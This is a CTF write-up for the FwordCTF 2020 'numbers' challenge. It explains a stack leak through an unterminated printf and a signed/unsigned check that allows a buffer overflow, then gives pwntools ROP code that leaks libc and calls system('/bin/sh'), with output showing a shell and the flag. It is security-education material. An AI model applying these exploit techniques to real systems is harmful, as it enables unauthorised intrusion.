# Numbers

We are given a 64-bit executable:
```bash
$ file numbers
numbers: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f76f3042db00cbbb5da977e530fac85c27dff93, stripped
```

The following protections are enabled:
```bash
checksec numbers
[*] '/home/vagrant/CTF/fword/numbers/numbers'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We see that no stack canary is present. This usually means that there will be a buffer overflow we can exploit.

The program asks for a number `<=60`, asks us if we are sure and then repeats the whole process, as long as we do not answer `n` to the `try again ?` dialogue:
```bash
 ./numbers

do you have any number in mind ??
42
are yo sure ??
yes
yes

try again ?
sure

do you have any number in mind ??
are yo sure ??

try again ?
```

Time to analyze the programm. The function `are_you_sure` reads up to the number of bytes we specified and then prints this out using `printf("%s", buf);`. Here lies the first weakness. The string we provide is reflected without being `null` terminated. Thus, we can leak addresses on the stack by providing a string that is a multiple of 8 bytes long (including `\n`). 

```c
__int64 __fastcall are_you_sure(unsigned int num)
{
  char buf[64]; // [rsp-40h] [rbp-40h] BYREF

  puts("are yo sure ??");
  read(0, buf, num);
  printf("%s", buf);
  return 0LL;
}
```

We can leak the PIE base using this code:
```python
def leak_addr(number):
    io.sendlineafter("do you have any number in mind ??", str(number))
    payload = "A"*(number-1)
    io.sendlineafter("are yo sure ??", payload)
    io.recvline()
    io.recvline()
    leak = io.recvline()
    leak = u64(leak.strip().ljust(8, "\x00"))
    return leak
```

Now we need to find a way to control `RIP`. The `read_number` function verifies whether our number is less or equal than 60.
The program converts our inpupt to an unsigned integer, but performs a signed comparison. By providing a negative number, we can makes the signed check true,
but then return on a huge unsigned number as return value. This number will then be used in the `are_you_sure` function (see above) to read that many bytes into a 64-byte buffer. Because canaries are disabled, we can get RIP control easily. 

```c
__int64 __fastcall read_number(int *num)
{
  __int64 result; // rax
  char buf; // [rsp-8h] [rbp-8h] BYREF

  puts("\ndo you have any number in mind ??");
  read(0, &buf, 8uLL);
  *num = atoi(&buf);
  result = (unsigned int)*num;
  if ( (int)result <= 60 )
    return result;
  puts("you're a naughty boy..");
  exit(1);
  return result;
}
```

We now use this overflow to leak a libc adress (puts) and return to the start of main, so we can exploit the buffer overflow again:
```python
io.sendlineafter("try again ?", "")
io.sendlineafter("do you have any number in mind ??", "-3") # negative number <=60 in signed comparision. Will read a lot of data

# Rop chain to leak libc
rop_exe =  ROP(exe)
rop_exe.puts(exe.got.puts)
rop_exe.call(piebase + 0x9c5) # main

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
libc = ELF('./libc6_2.28-0ubuntu1_amd64.so') # remote

# create payload
payload = "A"*64
payload += "B"*8
payload += str(rop_exe)

io.sendafter("are yo sure ??", payload)
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB")
```

Analyzing the address of the leak and using the [libc database](https://libc.blukat.me/) we identify that `libc6_2.28-0ubuntu1_amd64.so` is used on the remote server. Knowing this, we can  exploit the buffer overflow a second time, now calling `system('/bin/sh')`. We just have to make sure that `RSP` is 0x10 bytes aligned (which it was not if called directly). We could do this using a `pop` gadget or by calling puts with some value and hoping to have better alignment:

```python
io.sendlineafter("do you have any number in mind ??", "-3") # negative number <=60 in signed comparision. Will read a lot of data

# create system('/bin/sh') rop chain
rop = ROP(libc)
rop.puts(libc.sym.puts) # stupid pivot because of 0x10 alignment for rsp
rop.system(next(libc.search("/bin/sh")))

#print rop.dump()

payload = "A"*64
payload += "B"*8
payload += str(rop)

io.sendafter("are yo sure ??", payload)
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB")

io.interactive()
```

Running the script gives us a shell and we can read the flag:

```bash
$  numbers python xpl.py
[*] '/home/vagrant/CTF/fword/numbers/numbers'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to numbers.fword.wtf on port 1237: Done
[+] piebase: 0x5560f04c7000
[*] Loaded 14 cached gadgets for 'numbers'
[*] '/home/vagrant/CTF/fword/numbers/libc6_2.28-0ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] libc address: 0x7f22d22fc000
[*] Loaded 196 cached gadgets for './libc6_2.28-0ubuntu1_amd64.so'
[*] Switching to interactive mode
o�1�"AUATI\x89�USH����ls
flag.txt
numbers
ynetd
$ cat flag.txt
FwordCTF{s1gN3d_nuMb3R5_c4n_b3_d4nG3r0us}
$
```

The full exploit can be found in [xpl.py](https://github.com/ybieri/ctf-writeups/edit/master/FwordCTF2020/numbers/xpl.py).
